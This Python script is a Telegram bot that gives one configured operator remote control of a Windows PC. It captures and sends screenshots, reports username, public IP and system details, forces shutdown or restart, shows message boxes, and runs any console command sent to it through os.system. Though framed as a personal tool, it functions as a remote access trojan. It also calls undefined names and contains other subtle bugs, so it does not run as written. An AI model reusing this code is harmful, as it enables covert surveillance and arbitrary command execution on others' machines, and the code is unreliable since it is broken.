import config

import telebot
from telebot import types

import os
import time
import requests
import platform
import ctypes
import PIL.ImageGrab
from PIL import Image, ImageDraw


bot = telebot.TeleBot(config.TOKEN_API)
my_id = config.USER_ID

user_dict = {}


class User:
    def __init__(self):
        keys = ['urldown', 'fin', 'curs']

        for key in keys:
            self.key = None


User.curs = 50

menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷 Take screen')
btnoff = types.KeyboardButton('🔴 Off PC')
btnrest = types.KeyboardButton('🔄 Restart PC')
btnpc = types.KeyboardButton('🖥 About PC')
btncmd = types.KeyboardButton('✅ Run command')
btnmsgbox = types.KeyboardButton('📩Send message')
menu_keyboard.row(btnscreen, btnpc, btnoff)
menu_keyboard.row(btnrest, btncmd, btnmsgbox)

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
    pass
else:
    f = open('msg.pt', 'tw', encoding='utf-8')
bot.send_message(my_id, "PC started", reply_markup=menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "📷 Take screen":
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                img = PIL.ImageGrab.grab()
                img.save("screen.png", "png")
                img = Image.open("screen.png")
                draw = ImageDraw.Draw(img)
                img.save("screen_with_mouse.png", "PNG")
                bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
                os.remove("screen.png")
                os.remove("screen_with_mouse.png")
            except:
                bot.send_message(my_id, "PC blocked")

        elif message.text == "✅ Run command":
            bot.send_message(my_id, "Specify the console command: ")
            bot.register_next_step_handler(message, cmd_process)

        elif message.text == "🔴 Off PC":
            bot.send_message(my_id, "Shutdown PC...")
            os.system('shutdown -s /t 0 /f')

        elif message.text == "🔄 Restart PC":
            bot.send_message(my_id, "Restart PC...")
            os.system('shutdown -r /t 0 /f')

        elif message.text == "📩Send message":
            bot.send_message(my_id, "Enter your message:")
            bot.register_next_step_handler(message, messaga_process)

        elif message.text == "🖥 About PC":
            req = requests.get("http://ip.42.pl/raw")
            ip = req.text
            uname = os.getlogin()
            windows = platform.platform()
            processor = platform.processor()
            bot.send_message(my_id, f"*User:* {uname}\n*IP:* {ip}\n*OS:* {windows}\n*Processor:* {processor}",
                             parse_mode="markdown")


def screen_process(message):
    try:
        img = PIL.ImageGrab.grab()
        img.save("screen.png", "png")
        img = Image.open("screen.png")
        draw = ImageDraw.Draw(img)
        img.save("screen_with_mouse.png", "PNG")
        bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
        os.remove("screen.png")
        os.remove("screen_with_mouse.png")
    except:
        bot.send_chat_action(my_id, 'typing')
        bot.send_message(my_id, "PC blocked")
        bot.register_next_step_handler(message, mouse_process)


def cmd_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.system(message.text)
        bot.send_message(my_id, f"Command \"{message.text}\" completed", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    except:
        bot.send_message(my_id, "Error! Unknown command")
        bot.register_next_step_handler(message, addons_process)


def messaga_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        MessageBox(None, message.text, 'PC tool', 0)
        bot.send_message(my_id, f"Message with text \"{message.text}\" was closed")
    except:
        bot.send_message(my_id, "Error")


def is_digit(string):
    if string.isdigit():
        return True
    else:
        try:
            float(string)
            return True
        except ValueError:
            return False


while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as E:
        print(E.args)
        time.sleep(2)
